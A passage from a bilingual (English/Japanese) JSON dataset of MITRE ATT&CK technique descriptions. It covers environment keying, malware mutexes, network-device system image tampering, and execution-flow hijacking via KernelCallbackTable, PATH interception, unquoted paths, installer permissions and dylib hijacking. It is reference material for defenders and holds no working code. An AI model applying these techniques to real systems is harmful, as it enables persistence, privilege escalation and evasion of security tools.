これは、侵害または操作されることを意図していない環境での機能の公開を防ぐために使用できます。\n\n他の[実行ガードレール](https://attack.mitre.org/techniques/T1480)と同様に、環境キーイングは、侵害されたり操作されたりすることを意図していない環境での機能の公開を防ぐために使用できます。この活動は、典型的な[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)とは異なります。[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)の使用には、既知のサンドボックス値のチェックと、一致がない場合にのみ実行を継続することが含まれる場合がありますが、環境キーイングの使用には、復号化とそれに続く実行が成功するために一致する必要がある、予想されるターゲット固有の値のチェックが含まれます。"
                    },
                    {
                        "id": "T1480.002",
                        "name_eng": "Mutual Exclusion",
                        "name_jp": "相互排他",
                        "description_eng": "Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time.(Citation: Microsoft Mutexes)\n\nWhile local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes.(Citation: Microsoft Mutexes) By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised.(Citation: Sans Mutexes 2012)\n\nIn Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself.(Citation: Intezer RedXOR 2021)(Citation: Deep Instinct BPFDoor 2023)\n\nMutex names may be hard-coded or dynamically generated using a predictable algorithm.(Citation: ICS Mutexes 2015)",
                        "description_jp": "攻撃者は、マルウェアに関連付けられたミューテックスの存在に基づいて、実行またはアクションを制約する可能性があります。ミューテックスは、リソースへのアクセスを同期するために使用されるロックメカニズムです。特定の時点では、1つのスレッドまたはプロセスのみがミューテックスを取得できます。(引用: Microsoft Mutexes)\n\nローカルミューテックスは特定のプロセス内にのみ存在し、複数のスレッドがリソースへのアクセスを同期できるようにしますが、システムミューテックスは複数のプロセスの活動を同期するために使用できます。(引用: Microsoft Mutexes) 特定のマルウェアに関連付けられた一意のシステムミューテックスを作成することにより、攻撃者はシステムが既に侵害されているかどうかを確認できます。(引用: Sans Mutexes 2012)\n\nLinux環境では、マルウェアは代わりにミューテックスファイルへのロック取得を試みる可能性があります。マルウェアがロックを取得できた場合、実行を継続します。失敗した場合は、自身の2番目のインスタンスを作成することを避けるために終了します。(引用: Intezer RedXOR 2021)(引用: Deep Instinct BPFDoor 2023)\n\nミューテックス名はハードコードされているか、予測可能なアルゴリズムを使用して動的に生成される場合があります。(引用: ICS Mutexes 2015)"
                    }
                ]
            },
            {
                "id": "T1601",
                "name_eng": "Modify System Image",
                "name_jp": "システムイメージの変更",
                "description_eng": "Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.\n\nTo change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",
                "description_jp": "攻撃者は、防御を弱体化させ、自身に新しい機能を提供するために、組み込みネットワークデバイスのオペレーティングシステムに変更を加える可能性があります。このようなデバイスでは、オペレーティングシステムは通常モノリシックであり、デバイスの機能と能力のほとんどは単一ファイルに含まれています。\n\nオペレーティングシステムを変更するために、攻撃者は通常、この1つのファイルに影響を与え、それを置き換えるか変更するだけで済みます。これは、即時の効果を得るためにシステム実行中にメモリ内でライブで行うことも、ネットワークデバイスの次回の起動時に変更を実装するためにストレージで行うこともできます。",
                "subtechniques": [
                    {
                        "id": "T1601.002",
                        "name_eng": "Downgrade System Image",
                        "name_jp": "システムイメージのダウングレード",
                        "description_eng": "Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution)\n\nOn embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.\n\nDowngrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001).",
                        "description_jp": "攻撃者は、セキュリティを弱体化させるために、ネットワークデバイスのオペレーティングシステムの古いバージョンをインストールする可能性があります。ネットワークデバイス上の古いオペレーティングシステムのバージョンは、多くの場合、暗号化強度が弱く、一般的に防御機能が少ないか、更新されていません。(引用: Cisco Synful Knock Evolution)\n\n組み込みデバイスでは、バージョンのダウングレードは通常、ストレージ内のオペレーティングシステムファイルを置き換えるだけで済みます。ほとんどの組み込みデバイスでは、これは目的のバージョンのオペレーティングシステムファイルのコピーをダウンロードし、次回のシステム再起動時にそのファイルから起動するようにデバイスを再構成することで達成できます。その後、攻撃者はデバイスを再起動してすぐに変更を実装することも、システムが次回再起動するまで待つこともできます。\n\nシステムイメージを古いバージョンにダウングレードすると、[暗号化の弱体化](https://attack.mitre.org/techniques/T1600)などの動作を可能にすることで、攻撃者が防御を回避できるようになる可能性があります。システムイメージのダウングレードは単独で行うことも、[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)と組み合わせて使用することもできます。"
                    },
                    {
                        "id": "T1601.001",
                        "name_eng": "Patch System Image",
                        "name_jp": "システムイメージのパッチ適用",
                        "description_eng": "Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen of the Dead) Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.\n\nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.\n\nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.\n\nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.\n\nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).  Adding new capabilities for the adversary’s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001).\n\nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. \n\nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005). \n\nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve persistence.",
                        "description_jp": "攻撃者は、新しい機能を導入したり既存の防御を弱体化させたりするために、ネットワークデバイスのオペレーティングシステムを変更する可能性があります。(引用: Killing the myth of Cisco IOS rootkits) (引用: Killing IOS diversity myth) (引用: Cisco IOS Shellcode) (引用: Cisco IOS Forensics Developments) (引用: Juniper Netscreen of the Dead) 一部のネットワークデバイスはモノリシックアーキテクチャで構築されており、オペレーティングシステム全体とデバイスの機能のほとんどが単一ファイルに含まれています。攻撃者は、将来の起動時にロードされるようにストレージ内のこのファイルを変更したり、実行時にメモリ内で変更したりする可能性があります。\n\nストレージ内のオペレーティングシステムを変更するために、攻撃者は通常、デバイスオペレータが利用できる標準的な手順を使用します。これには、TFTP、FTP、SCP、またはコンソール接続など、ネットワークデバイスで一般的に使用されるプロトコルを介して新しいファイルをダウンロードすることが含まれる場合があります。元のファイルが上書きされるか、新しいファイルがその横に書き込まれ、デバイスが侵害されたイメージから起動するように再構成される場合があります。\n\nメモリ内のオペレーティングシステムを変更するために、攻撃者は通常2つの方法のいずれかを使用できます。1つ目の方法では、攻撃者は元の変更されていない実行中のオペレーティングシステム内のネイティブデバッグコマンドを利用して、実行中のオペレーティングシステムを含む関連するメモリアドレスを直接変更します。この方法は通常、デバイスへの管理者レベルのアクセスが必要です。\n\nメモリ内のオペレーティングシステムを変更する2番目の方法では、攻撃者はブートローダーを利用します。ブートローダーは、デバイス起動時に最初にロードされるソフトウェアであり、次にオペレーティングシステムを起動します。攻撃者は、[ROMMONキット](https://attack.mitre.org/techniques/T1542/004)メソッドなどを介して以前にブートローダーに埋め込まれた悪意のあるコードを使用して、メモリ内の実行中のオペレーティングシステムコードを直接操作する可能性があります。ブートローダー内のこの悪意のあるコードは、攻撃者に直接メモリ操作の機能を提供し、実行時にライブオペレーティングシステムにパッチを適用できるようにします。\n\nシステムイメージファイルに保存されている命令を変更することにより、敵対者は既存の防御を弱体化させるか、デバイスが以前は持っていなかった新しい機能を提供することができます。妨害される可能性のある既存の防御の例としては、[暗号化の弱体化](https://attack.mitre.org/techniques/T1600)による暗号化、[ネットワークデバイス認証](https://attack.mitre.org/techniques/T1556/004)による認証、[ネットワーク境界ブリッジング](https://attack.mitre.org/techniques/T1599)による境界防御などがあります。敵対者の目的のために新しい機能を追加することには、[キーロギング](https://attack.mitre.org/techniques/T1056/001)、[マルチホッププロキシ](https://attack.mitre.org/techniques/T1090/003)、[ポートノッキング](https://attack.mitre.org/techniques/T1205/001)などがあります。\n\n敵対者はまた、オペレーティングシステム内の既存のコマンドを侵害して、防御者を誤解させる偽の出力を生成する可能性があります。[システムイメージのダウングレード](https://attack.mitre.org/techniques/T1601/002)と組み合わせてこの方法を使用する場合、侵害されたシステムコマンドの一例として、現在実行中のオペレーティングシステムのバージョンを表示するコマンドの出力を変更することが挙げられます。オペレーティングシステムにパッチを適用することにより、敵対者はこのコマンドを変更して、代わりにシステムのダウングレードによって置き換えられた元のより高いリビジョン番号を表示させることができます。\n\nオペレーティングシステムがストレージにパッチを当てられる場合、これは常駐ストレージ（通常は不揮発性のフラッシュメモリの一種）または[TFTPブート](https://attack.mitre.org/techniques/T1542/005)を介して達成できます。\n\nメモリ内の実行中のオペレーティングシステムに対してこのテクニックが実行され、保存されたコピーに対して実行されない場合、このテクニックは再起動後も持続しません。しかし、オペレーティングシステムのライブメモリ変更は、永続性を達成するために[ROMMONキット](https://attack.mitre.org/techniques/T1542/004)と組み合わせることができます。"
                    }
                ]
            },
            {
                "id": "T1574",
                "name_eng": "Hijack Execution Flow",
                "name_jp": "実行フローのハイジャック",
                "description_eng": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
                "description_jp": "攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。\n\n攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1574.010",
                        "name_eng": "Services File Permissions Weakness",
                        "name_jp": "サービスファイルパーミッションの脆弱性",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
                        "description_jp": "攻撃者は、サービスによって使用されるバイナリをハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。攻撃者は、Windowsサービスのアクセス許可の欠陥を使用して、サービス開始時に実行されるバイナリを置き換える可能性があります。これらのサービスプロセスは、その機能の一部として、または他のアクションを実行するために、特定のバイナリを自動的に実行する場合があります。ターゲットバイナリを含むファイルシステムディレクトリのアクセス許可、またはバイナリ自体のアクセス許可が不適切に設定されている場合、ターゲットバイナリはユーザーレベルのアクセス許可を使用して別のバイナリで上書きされ、元のプロセスによって実行される可能性があります。元のプロセスとスレッドがより高いアクセス許可レベルで実行されている場合、置き換えられたバイナリもSYSTEMを含むより高いレベルのアクセス許可で実行されます。\n\n攻撃者は、より高いアクセス許可レベルでコードを実行する手段として、正当なバイナリを悪意のあるバイナリに置き換えるためにこのテクニックを使用する可能性があります。実行中のプロセスが特定の時間に実行されるように設定されている場合、または特定のイベント（システムの起動など）中に実行されるように設定されている場合、このテクニックは永続化にも使用できます。"
                    },
                    {
                        "id": "T1574.013",
                        "name_eng": "KernelCallbackTable",
                        "name_jp": "KernelCallbackTable",
                        "description_eng": "Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)\n\nAn adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.\n\nA pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)\n\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスの<code>KernelCallbackTable</code>を悪用してその実行フローをハイジャックし、独自のペイロードを実行する可能性があります。(引用: Lazarus APT January 2022)(引用: FinFisher exposed ) <code>KernelCallbackTable</code>はプロセス環境ブロック（PEB）にあり、<code>user32.dll</code>がロードされるとGUIプロセスで利用可能なグラフィック関数の配列に初期化されます。(引用: Windows Process Injection KernelCallbackTable)\n\n攻撃者は、元のコールバック関数を悪意のあるペイロードに置き換えることにより、<code>KernelCallbackTable</code>を使用してプロセスの実行フローをハイジャックする可能性があります。コールバック関数の変更は、別のプロセスへの[リフレクティブコードローディング](https://attack.mitre.org/techniques/T1620)や[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)など、関連する動作を含むさまざまな方法で実現できます。\n\n<code>KernelCallbackTable</code>のメモリアドレスへのポインタは、PEBを特定することによって取得できます（例：<code>NtQueryInformationProcess()</code> [ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数の呼び出しを介して）。(引用: NtQueryInformationProcess) ポインタが見つかると、<code>KernelCallbackTable</code>を複製し、テーブル内の関数（例：<code>fnCOPYDATA</code>）を悪意のあるペイロードのアドレスに設定できます（例：<code>WriteProcessMemory()</code>を介して）。その後、PEBはテーブルの新しいアドレスで更新されます。改ざんされた関数が呼び出されると、悪意のあるペイロードがトリガーされます。(引用: Lazarus APT January 2022)\n\n改ざんされた関数は通常、Windowsメッセージを使用して呼び出されます。プロセスがハイジャックされ、悪意のあるコードが実行された後、<code>KernelCallbackTable</code>は悪意のあるペイロードの残りの部分によって元の状態に復元される場合もあります。(引用: Lazarus APT January 2022) 実行が正当なプロセスの下でマスクされるため、<code>KernelCallbackTable</code>を使用して実行フローをハイジャックすると、セキュリティ製品による検出を回避できる場合があります。"
                    },
                    {
                        "id": "T1574.007",
                        "name_eng": "Path Interception by PATH Environment Variable",
                        "name_jp": "PATH環境変数によるパスインターセプション",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022)",
                        "description_jp": "攻撃者は、ライブラリのロードに使用される環境変数をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。PATH環境変数には、スクリプトまたはコマンドラインから呼び出されたバイナリを検索するためにOSが順次検索するディレクトリ（ユーザーおよびシステム）のリストが含まれています。\n\n攻撃者は、PATH環境変数に格納されているディレクトリのリストの前のエントリに悪意のあるプログラムを配置することで、OSがそのPATHリストを順次検索するときに、正当なバイナリではなく悪意のあるバイナリを実行するように仕向けることができます。\n\n例えば、Windowsで攻撃者が「net.exe」という名前の悪意のあるプログラムを`C:\\example path`に配置し、これがデフォルトでPATH環境変数の`C:\\Windows\\system32\\net.exe`より前にある場合、コマンドラインから「net」が実行されると、システムの正当な実行可能ファイルである`C:\\Windows\\system32\\net.exe`の代わりに`C:\\example path`が呼び出されます。プログラムを実行する一部のメソッドは、プログラムのパスが指定されていない場合に検索される場所を決定するためにPATH環境変数に依存します。例えば、[コマンドおよびスクリプトインタープリター](https://attack.mitre.org/techniques/T1059)からプログラムを実行する場合などです。(引用: ExpressVPN PATH env Windows 2021)\n\n攻撃者はまた、検索対象のディレクトリを指定する$PATH変数を直接変更することもあります。攻撃者は、書き込みアクセス権を持つディレクトリを指すように`$PATH`変数を変更できます。$PATH変数を使用するプログラムが呼び出されると、OSは指定されたディレクトリを検索し、悪意のあるバイナリを実行します。macOSでは、これは$HOME変数を変更することによっても実行できます。これらの変数は、コマンドライン、launchctl、[Unixシェル構成の変更](https://attack.mitre.org/techniques/T1546/004)、または`/etc/paths.d`フォルダの内容を変更することによって変更できます。(引用: uptycs Fake POC linux malware 2023)(引用: nixCraft macOS PATH variables)(引用: Elastic Rules macOS launchctl 2022)"
                    },
                    {
                        "id": "T1574.005",
                        "name_eng": "Executable Installer File Permissions Weakness",
                        "name_jp": "実行可能インストーラーファイルのアクセス許可の脆弱性",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
                        "description_jp": "攻撃者は、インストーラーによって使用されるバイナリをハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。これらのプロセスは、その機能の一部として、または他のアクションを実行するために、特定のバイナリを自動的に実行する場合があります。ターゲットバイナリを含むファイルシステムディレクトリのアクセス許可、またはバイナリ自体のアクセス許可が不適切に設定されている場合、ターゲットバイナリはユーザーレベルのアクセス許可を使用して別のバイナリで上書きされ、元のプロセスによって実行される可能性があります。元のプロセスとスレッドがより高いアクセス許可レベルで実行されている場合、置き換えられたバイナリもSYSTEMを含むより高いレベルのアクセス許可で実行されます。\n\nこのテクニックの別のバリエーションは、実行可能ファイル形式の自己解凍インストーラーに共通する脆弱性を利用することによって実行できます。インストールプロセス中、インストーラーがDLL、EXE、またはその他のペイロードなどのバイナリを展開するために<code>%TEMP%</code>ディレクトリ内のサブディレクトリを使用するのが一般的です。インストーラーがサブディレクトリとファイルを作成するとき、書き込みアクセスを制限するための適切なアクセス許可をしばしば設定しないため、サブディレクトリに配置された信頼できないコードの実行や、インストールプロセスで使用されるバイナリの上書きが可能になります。この動作は[DLL](https://attack.mitre.org/techniques/T1574/001)検索順序ハイジャックに関連しており、これを利用する可能性があります。\n\n攻撃者はこのテクニックを使用して、より高い権限レベルでコードを実行する手段として、正当なバイナリを悪意のあるバイナリに置き換える可能性があります。一部のインストーラーは、攻撃者が制御するコードを実行する際に権限昇格をもたらす昇格された権限を必要とする場合もあります。この動作は[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002)に関連しています。既存の一般的なインストーラーにおけるこの脆弱性のいくつかの例がソフトウェアベンダーに報告されています。(引用: mozilla_sec_adv_2012) (引用: Executable Installers are Vulnerable) 実行中のプロセスが特定の時間に実行されるように設定されている場合、または特定のイベント（システムの起動など）中に実行されるように設定されている場合、このテクニックは永続化にも使用できます。"
                    },
                    {
                        "id": "T1574.009",
                        "name_eng": "Path Interception by Unquoted Path",
                        "name_jp": "引用符なしパスによるパスインターセプション",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
                        "description_jp": "攻撃者は、脆弱なファイルパス参照をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。攻撃者は、パス内の上位ディレクトリに実行可能ファイルを配置することにより、周囲に引用符がないパスを利用して、Windowsが攻撃者の実行可能ファイルを選択して起動するように仕向けることができます。\n\nサービスパス（引用: Microsoft CurrentControlSet Services）およびショートカットパスも、パスに1つ以上のスペースがあり、引用符で囲まれていない場合（例：<code>C:\\unsafe path with space\\program.exe</code> 対 <code>\"C:\\safe path with space\\program.exe\"</code>）、パスインターセプションに対して脆弱である可能性があります。(引用: Help eliminate unquoted path)（Windowsレジストリキーに格納）攻撃者はパスの上位ディレクトリに実行可能ファイルを配置でき、Windowsは意図した実行可能ファイルの代わりにその実行可能ファイルを解決します。例えば、ショートカットのパスが<code>C:\\program files\\myapp.exe</code>である場合、攻撃者は<code>C:\\program.exe</code>にプログラムを作成し、意図したプログラムの代わりに実行させることができます。(引用: Windows Unquoted Services) (引用: Windows Privilege Escalation Guide)\n\nこのテクニックは、実行可能ファイルが定期的に呼び出される場合に永続性のために使用でき、また、傍受された実行可能ファイルがより高い権限を持つプロセスによって開始される場合には権限昇格のために使用できます。"
                    },
                    {
                        "id": "T1574.004",
                        "name_eng": "Dylib Hijacking",
                        "name_jp": "Dylibハイジャック",
                        "description_eng": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",
                        "description_jp": "攻撃者は、被害者のアプリケーションが実行時に検索するパスに、予想される名前の悪意のあるダイナミック・ライブラリ（dylib）を配置することで、独自のペイロードを実行する可能性があります。ダイナミック・ローダーは、検索パスの順序に基づいて、dylib を見つけようとします。ディリブへのパスの先頭には <code>@rpath</code> を付けることができ、開発者は相対パスを使用して実行可能ファイルの場所に基づいて実行時に使用される検索パスの配列を指定することができます。 さらに、<code>LC_LOAD_WEAK_DYLIB</code> 関数のような弱いリンクが使用されている場合、期待される dylib が存在しなくてもアプリケーションは実行されます。弱いリンクによって、開発者は新しいAPIが追加されたときに、複数のmacOSバージョンでアプリケーションを実行することができます。\n\n攻撃者は、特定されたパスに欠落している dylib の名前を持つ悪意のある dylib を挿入することで、実行を獲得する可能性があります（引用：Wardle Dylib Hijack Vulnerable Apps）（引用：Wardle Dylib Hijacking OSX 2015）（引用：Github EmpireProject HijackScanner）（引用：Github EmpireProject CreateHijacker Dylib） dylib はアプリケーションのアドレス空間にロードされ、悪意のある dylib がアプリケーションの特権レベルとリソースを継承できるようになります。アプリケーションによっては、特権の昇格や無制限のネットワークアクセスを引き起こす可能性があります。この方法は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品からの検出を回避することもできます。(引用：Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)"
                    },
                    {
                        "id": "T1574.006",
                        "name_eng": "Dynamic Linker Hijacking",
                        "name_jp": "ダイナミックリンカーハイジャック",
